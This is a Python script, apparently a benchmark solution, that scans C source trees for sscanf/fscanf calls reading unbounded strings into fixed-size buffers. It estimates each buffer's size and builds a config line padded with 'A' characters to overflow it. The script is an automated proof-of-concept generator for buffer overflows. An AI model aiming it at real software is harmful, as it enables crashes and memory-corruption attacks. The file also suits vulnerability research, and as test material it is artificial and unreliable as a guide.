import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _decode_bytes(data: bytes) -> Optional[str]:
    if not data:
        return ""
    if b"\x00" in data:
        return None
    try:
        return data.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return data.decode("latin-1", errors="ignore")
        except Exception:
            return None


def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
    exts = {
        ".c", ".h", ".cc", ".cpp", ".cxx", ".hh", ".hpp", ".hxx",
        ".l", ".y", ".in", ".m4", ".am", ".ac", ".txt", ".md"
    }
    conf_exts = {".conf", ".cfg", ".ini", ".cnf", ".rc", ".config", ".properties"}

    def want(name: str) -> bool:
        low = name.lower()
        _, ext = os.path.splitext(low)
        if ext in exts or ext in conf_exts:
            return True
        if "config" in low or "conf" in low or "cfg" in low:
            return True
        return False

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, src_path)
                if not want(rel):
                    continue
                try:
                    st = os.stat(p)
                    if st.st_size <= 0 or st.st_size > 3_000_000:
                        continue
                    with open(p, "rb") as f:
                        data = f.read()
                except Exception:
                    continue
                txt = _decode_bytes(data)
                if txt is None:
                    continue
                yield rel.replace("\\", "/"), txt
        return

    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return

    with tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            if not want(name):
                continue
            if m.size <= 0 or m.size > 3_000_000:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            txt = _decode_bytes(data)
            if txt is None:
                continue
            yield name, txt


def _split_top_level_commas(s: str) -> List[str]:
    parts = []
    buf = []
    depth_par = depth_br = depth_cur = 0
    i = 0
    n = len(s)
    in_str = False
    in_chr = False
    esc = False
    while i < n:
        c = s[i]
        if in_str:
            buf.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            buf.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
            i += 1
            continue

        if c == '"':
            in_str = True
            buf.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            buf.append(c)
            i += 1
            continue

        if c == "(":
            depth_par += 1
        elif c == ")":
            if depth_par > 0:
                depth_par -= 1
        elif c == "[":
            depth_br += 1
        elif c == "]":
            if depth_br > 0:
                depth_br -= 1
        elif c == "{":
            depth_cur += 1
        elif c == "}":
            if depth_cur > 0:
                depth_cur -= 1

        if c == "," and depth_par == 0 and depth_br == 0 and depth_cur == 0:
            parts.append("".join(buf).strip())
            buf = []
            i += 1
            continue

        buf.append(c)
        i += 1

    tail = "".join(buf).strip()
    if tail:
        parts.append(tail)
    return parts


_c_str_lit_re = re.compile(r'"(?:\\.|[^"\\])*"')


def _unescape_c_string(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        c2 = s[i]
        i += 1
        if c2 == "n":
            out.append("\n")
        elif c2 == "r":
            out.append("\r")
        elif c2 == "t":
            out.append("\t")
        elif c2 == "0":
            out.append("\x00")
        elif c2 == "\\":
            out.append("\\")
        elif c2 == '"':
            out.append('"')
        elif c2 == "'":
            out.append("'")
        elif c2 in "xX":
            hexd = []
            while i < n and len(hexd) < 2 and s[i] in "0123456789abcdefABCDEF":
                hexd.append(s[i])
                i += 1
            if hexd:
                try:
                    out.append(chr(int("".join(hexd), 16)))
                except Exception:
                    pass
        elif c2.isdigit():
            octd = [c2]
            while i < n and len(octd) < 3 and s[i].isdigit():
                octd.append(s[i])
                i += 1
            try:
                out.append(chr(int("".join(octd), 8)))
            except Exception:
                pass
        else:
            out.append(c2)
    return "".join(out)


def _extract_concat_c_string(arg: str) -> Optional[str]:
    s = arg.lstrip()
    if not s.startswith('"'):
        return None
    pos = 0
    pieces = []
    while True:
        m = _c_str_lit_re.match(s, pos)
        if not m:
            break
        lit = m.group(0)
        pieces.append(_unescape_c_string(lit[1:-1]))
        pos = m.end()
        while pos < len(s) and s[pos].isspace():
            pos += 1
        if pos >= len(s) or s[pos] != '"':
            break
    return "".join(pieces) if pieces else None


def _find_matching_paren(text: str, start_paren_idx: int) -> Optional[int]:
    depth = 0
    i = start_paren_idx
    n = len(text)
    in_str = False
    in_chr = False
    esc = False
    while i < n:
        c = text[i]
        if in_str:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
            i += 1
            continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return None


def _parse_format_conversions(fmt: str) -> List[dict]:
    convs = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            i += 2
            continue
        j = i + 1
        suppressed = False
        if j < n and fmt[j] == "*":
            suppressed = True
            j += 1
        width_present = False
        while j < n and fmt[j].isdigit():
            width_present = True
            j += 1
        if j + 1 < n and fmt[j] == "$" and fmt[j - 1].isdigit():
            while j < n and fmt[j].isdigit():
                j += 1
        while j < n:
            if fmt.startswith("hh", j):
                j += 2
                continue
            if fmt.startswith("ll", j):
                j += 2
                continue
            if fmt[j] in "hljztL":
                j += 1
                continue
            break
        if j >= n:
            break
        c = fmt[j]
        if c == "[":
            k = j + 1
            if k < n and fmt[k] == "^":
                k += 1
            if k < n and fmt[k] == "]":
                k += 1
            while k < n and fmt[k] != "]":
                k += 1
            if k < n and fmt[k] == "]":
                k += 1
            convs.append({
                "kind": "[",
                "unsafe_str": (not width_present),
                "suppressed": suppressed,
                "pos": i,
                "end": k
            })
            i = k
            continue
        convs.append({
            "kind": c,
            "unsafe_str": (c == "s" and (not width_present)),
            "suppressed": suppressed,
            "pos": i,
            "end": j + 1
        })
        i = j + 1
    return convs


def _simplify_identifier(expr: str) -> Optional[str]:
    e = expr.strip()
    e = re.sub(r'^\(\s*[^)]+\)\s*', "", e)
    e = e.lstrip("&*")
    e = e.strip()
    m = re.match(r"^([A-Za-z_]\w*)$", e)
    if m:
        return m.group(1)
    m = re.match(r"^([A-Za-z_]\w*)\s*\[", e)
    if m:
        return m.group(1)
    m = re.match(r"^([A-Za-z_]\w*)\s*->", e)
    if m:
        return m.group(1)
    m = re.match(r"^([A-Za-z_]\w*)\s*\.", e)
    if m:
        return m.group(1)
    return None


_decl_arr_re_tpl = r"(?:^|[;{{}}\n])\s*(?:static\s+)?(?:const\s+)?(?:unsigned\s+)?(?:char|uint8_t|u8|BYTE|unsigned\s+char)\s+{var}\s*\[\s*(\d+)\s*\]"


def _find_array_decl_size(text_before: str, var: str) -> Optional[int]:
    if not var:
        return None
    pat = re.compile(_decl_arr_re_tpl.format(var=re.escape(var)))
    last = None
    for m in pat.finditer(text_before):
        last = m
    if last:
        try:
            return int(last.group(1))
        except Exception:
            return None
    return None


def _build_global_decl_map(text: str) -> Dict[str, int]:
    m: Dict[str, int] = {}
    pat = re.compile(r"(?:^|[;{}()\n])\s*(?:static\s+)?(?:const\s+)?(?:unsigned\s+)?(?:char|uint8_t|u8|BYTE|unsigned\s+char)\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]", re.M)
    for mm in pat.finditer(text):
        var = mm.group(1)
        try:
            sz = int(mm.group(2))
        except Exception:
            continue
        if var not in m or sz > m[var]:
            m[var] = sz
    return m


def _detect_ini_style(all_texts: List[Tuple[str, str]]) -> bool:
    for _, t in all_texts:
        if "ini_parse" in t or "iniparser" in t or "inih" in t:
            return True
    return False


def _max_bin_dest_size(all_texts: List[Tuple[str, str]]) -> Optional[int]:
    best = None
    idx_pat1 = re.compile(r"([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*)\s*/\s*2\s*\]")
    idx_pat2 = re.compile(r"([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*)\s*>>\s*1\s*\]")
    for _, t in all_texts:
        for m in idx_pat1.finditer(t):
            dest = m.group(1)
            pos = m.start()
            win = t[max(0, pos - 800):pos + 400]
            if "strlen(" not in win and "hex" not in win.lower():
                continue
            sz = _find_array_decl_size(t[max(0, pos - 5000):pos], dest)
            if sz is None:
                continue
            if best is None or sz > best:
                best = sz
        for m in idx_pat2.finditer(t):
            dest = m.group(1)
            pos = m.start()
            win = t[max(0, pos - 800):pos + 400]
            if "strlen(" not in win and "hex" not in win.lower():
                continue
            sz = _find_array_decl_size(t[max(0, pos - 5000):pos], dest)
            if sz is None:
                continue
            if best is None or sz > best:
                best = sz
    return best


def _choose_candidate(all_texts: List[Tuple[str, str]]) -> Tuple[str, Optional[int]]:
    candidates = []
    for path, t in all_texts:
        gdecl = _build_global_decl_map(t)
        for m in re.finditer(r"\b(sscanf|fscanf)\s*\(", t):
            fn = m.group(1)
            lpar = t.find("(", m.end() - 1)
            if lpar < 0:
                continue
            rpar = _find_matching_paren(t, lpar)
            if rpar is None:
                continue
            arg_str = t[lpar + 1:rpar]
            args = _split_top_level_commas(arg_str)
            if len(args) < 2:
                continue
            fmt = _extract_concat_c_string(args[1])
            if fmt is None:
                continue
            convs = _parse_format_conversions(fmt)
            if not convs:
                continue
            dest_args = args[2:]
            mapped = []
            di = 0
            for c in convs:
                if c["suppressed"]:
                    continue
                if di >= len(dest_args):
                    break
                mapped.append((c, dest_args[di]))
                di += 1
            if not mapped:
                continue

            unsafe_str_targets = []
            for c, da in mapped:
                if c.get("unsafe_str"):
                    unsafe_str_targets.append((c, da))

            if not unsafe_str_targets:
                continue

            pos_call = m.start()
            before = t[max(0, pos_call - 6000):pos_call]

            for c, da in unsafe_str_targets:
                var = _simplify_identifier(da)
                sz = None
                if var:
                    sz = _find_array_decl_size(before, var)
                    if sz is None:
                        sz = gdecl.get(var)

                score = 0
                lowfmt = fmt.lower()
                lowpath = path.lower()
                if "hex" in lowfmt:
                    score += 12
                if var and "hex" in var.lower():
                    score += 12
                if var and any(k in var.lower() for k in ("key", "seed", "token", "secret", "cert", "data")):
                    score += 4
                if any(k in lowpath for k in ("conf", "cfg", "ini", "config")):
                    score += 4
                if fn == "fscanf":
                    score += 1
                if sz is not None:
                    if 128 <= sz <= 4096:
                        score += 6
                    elif 32 <= sz < 128:
                        score += 2
                    else:
                        score -= 1

                build_type = "token"
                template = "{VAL}\n"

                # Prefer key/value formats like "%[^=]=%s" (or with spaces) so we can use "a=<VAL>"
                # Detect '=' or ':' use.
                if re.search(r"%\s*\[\s*\^?\s*=\s*\].*=[^%]*%(?!\d)s", fmt):
                    build_type = "kv"
                    template = "a={VAL}\n"
                    score += 8
                elif re.search(r"%\s*\[\s*\^?\s*:\s*\].*:[^%]*%(?!\d)s", fmt):
                    build_type = "kv"
                    template = "a:{VAL}\n"
                    score += 7
                elif re.search(r"%(?!\d)s\s+%(?!\d)s", fmt):
                    # Two-token format: "<opt> <val>"
                    build_type = "two"
                    template = "a {VAL}\n"
                    score += 4
                else:
                    # If our unsafe conversion is the first conversion, we can use literal prefix
                    # before it as the line prefix.
                    first_conv_pos = None
                    for cc in convs:
                        if cc["suppressed"]:
                            continue
                        first_conv_pos = cc["pos"]
                        break
                    if first_conv_pos is not None and c["pos"] == first_conv_pos:
                        prefix = fmt[:c["pos"]]
                        if prefix:
                            build_type = "lit"
                            template = prefix + "{VAL}\n"
                            score += 5
                            if "0x" in prefix.lower():
                                score += 1

                if "hex" in lowfmt and ("=" in fmt or ":" in fmt):
                    score += 1

                candidates.append((score, template, sz))

    if not candidates:
        return "hex={VAL}\n", None
    candidates.sort(key=lambda x: x[0], reverse=True)
    best = candidates[0]
    return best[1], best[2]


def _choose_config_from_samples(all_texts: List[Tuple[str, str]]) -> Optional[str]:
    best = None
    best_score = -1
    for path, t in all_texts:
        low = path.lower()
        if not any(ext in low for ext in (".conf", ".cfg", ".ini", ".cnf", ".rc", ".config")) and "config" not in low:
            continue
        if len(t) > 20000:
            continue
        lines = t.splitlines()
        if not lines:
            continue
        score = 0
        if "=" in t:
            score += 2
        if "[" in t and "]" in t and "\n[" in "\n" + t:
            score += 1
        for ln in lines:
            s = ln.strip()
            if not s or s.startswith("#") or s.startswith(";"):
                continue
            if "=" in s or ":" in s:
                score += 1
            if re.search(r"(0x)?[0-9a-fA-F]{16,}", s):
                score += 3
                break
        if score > best_score:
            best_score = score
            best = t
    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        all_texts = list(_iter_source_texts(src_path))
        ini_style = _detect_ini_style(all_texts)

        template, buf_sz = _choose_candidate(all_texts)
        bin_sz = _max_bin_dest_size(all_texts)

        if buf_sz is not None:
            need = buf_sz + 1
        else:
            need = 0
        if bin_sz is not None:
            need = max(need, 2 * (bin_sz + 1))
        if need <= 0:
            need = 544  # conservative fallback close to the known PoC scale

        if need % 2 == 1:
            need += 1

        # Keep within a reasonable line length to avoid truncation in common fgets buffers
        if need > 1200:
            need = 1200
            if need % 2 == 1:
                need += 1

        val = "A" * need

        # If we have a plausible sample config, try to keep INI shape (optional section).
        # But keep output minimal; only include section header if INI style detected.
        line = template.replace("{VAL}", val)

        if ini_style and not line.lstrip().startswith("["):
            # Ensure at least one section header for INI parsers
            out = "[a]\n" + line
        else:
            out = line

        return out.encode("ascii", errors="ignore")